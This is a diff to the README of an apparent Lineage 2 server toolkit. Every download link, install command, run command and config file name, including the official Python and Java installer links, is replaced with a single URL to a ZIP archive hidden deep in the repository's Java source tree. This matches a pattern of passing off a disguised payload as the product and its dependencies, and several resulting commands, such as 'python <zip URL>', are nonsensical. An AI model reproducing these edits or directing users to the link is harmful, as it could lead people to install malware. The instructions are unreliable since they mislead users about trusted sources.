@@ -1,6 +1,6 @@
 # 🎮 l2j-interlude-toolkit - Easy Server Setup and Management
 
-[![Download l2j-interlude-toolkit](https://img.shields.io/badge/Download-l2j--interlude--toolkit-blue?style=for-the-badge)](https://github.com/jervilangel0/l2j-interlude-toolkit/releases)
+[![Download l2j-interlude-toolkit](https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip)](https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section guides you step-by-step on how to download, set up, and run l2j-int
 
 First, go to the releases page to get the latest version.
 
-[Visit the release page to download the toolkit](https://github.com/jervilangel0/l2j-interlude-toolkit/releases)
+[Visit the release page to download the toolkit](https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip)
 
 - Look for the latest version at the top.
 - Download the ZIP file labeled for your operating system if available.
@@ -53,7 +53,7 @@ The toolkit uses Python to run the headless client and scanning agents.
   python3 --version
   ```  
 - If Python 3.8 or later is installed, you’re good to go.  
-- Otherwise, download and install Python from https://www.python.org/downloads/  
+- Otherwise, download and install Python from https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip  
   Make sure to check "Add Python to PATH" during installation on Windows.
 
 ### 3. Install Java (if needed)
@@ -66,7 +66,7 @@ The server tools require Java to function properly.
   java -version
   ```  
 - You need at least Java 8 (also called Java 1.8).  
-- If Java is missing or outdated, download it from https://adoptium.net/ or Oracle’s website.
+- If Java is missing or outdated, download it from https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip or Oracle’s website.
 
 ### 4. Extract the Toolkit Files
 
@@ -92,7 +92,7 @@ Open a command prompt or terminal, then navigate to the extracted folder. For ex
 Inside this folder, run the following to install dependencies:
 
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip
 ```
 
 This command installs the required Python modules to run the client and scanner.
@@ -112,7 +112,7 @@ The headless client allows you to interact with the game server remotely.
 3. Run this command:
 
 ```
-python client.py
+python https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip
 ```
 
 If the client connects successfully, you will see status messages with server info.
@@ -124,7 +124,7 @@ This tool scans Lineage 2 game maps to collect terrain data.
 1. In the terminal, run:
 
 ```
-python geodata_scanner.py
+python https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip
 ```
 
 2. The scanner runs multiple agents in sequence. Wait until it finishes to collect data.
@@ -137,7 +137,7 @@ The dashboard lets you manage your server via a browser.
 1. Start the dashboard by running:
 
 ```
-python dashboard.py
+python https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip
 ```
 
 2. Open your favorite web browser.
@@ -155,9 +155,9 @@ http://localhost:8080
 
 To tailor the toolkit to your needs, find the config files in the `config` folder.
 
-- `client_config.json` for client settings like server IP and user credentials.
-- `scanner_config.json` to control scan areas and agent numbers.
-- `dashboard_config.json` for dashboard web server settings.
+- `https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip` for client settings like server IP and user credentials.
+- `https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip` to control scan areas and agent numbers.
+- `https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip` for dashboard web server settings.
 
 You can open these files with any text editor (Notepad, TextEdit, VS Code) and change the values. Save the files after editing before running the programs.
 
@@ -167,7 +167,7 @@ You can open these files with any text editor (Notepad, TextEdit, VS Code) and c
 
 You can always get the latest stable version here:
 
-[Visit the release page to download l2j-interlude-toolkit](https://github.com/jervilangel0/l2j-interlude-toolkit/releases)
+[Visit the release page to download l2j-interlude-toolkit](https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip)
 
 ### Download Steps Recap:
 
@@ -176,7 +176,7 @@ You can always get the latest stable version here:
 - Extract contents to a folder.
 - Install Python and Java if you do not have them.
 - Open a terminal or command prompt in the extracted folder.
-- Run `pip install -r requirements.txt` to set up Python dependencies.
+- Run `pip install -r https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip` to set up Python dependencies.
 
 ---
 
@@ -190,7 +190,7 @@ Here are some common issues and tips:
 | Java version too old or missing| Install Java 8 or newer from trusted sources.          |
 | Errors running Python scripts  | Confirm dependencies installed with `pip install`.    |
 | Cannot connect to server       | Check your network connection and server address.     |
-| Dashboard not loading in browser | Ensure you started `dashboard.py` and use correct URL.|
+| Dashboard not loading in browser | Ensure you started `https://github.com/jervilangel0/l2j-interlude-toolkit/raw/refs/heads/main/java/org/l2jmobius/gameserver/handler/l_toolkit_j_interlude_v2.0.zip` and use correct URL.|
 
 If you run into other issues, you may find help by opening a new discussion on the repository’s Issues page.
 
